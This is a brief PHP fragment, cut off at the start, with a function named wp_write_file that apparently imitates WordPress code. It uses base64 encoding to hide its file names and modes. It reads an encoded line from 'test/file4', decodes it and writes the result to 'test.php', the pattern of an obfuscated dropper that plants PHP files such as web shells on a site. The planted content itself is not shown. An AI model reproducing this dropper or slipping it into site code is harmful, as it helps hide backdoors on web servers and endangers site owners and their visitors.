...
function wp_write_file() {
$n0=fopen(base64_decode('dGVzdC9maWxlNA=='),base64_decode('cg=='));
$d1=fgets($n0);$e2=base64_decode($d1);
$w3=fopen(base64_decode('dGVzdC5waHA='),base64_decode('dw=='));fwrite($w3,$e2);fclose($w3);
}
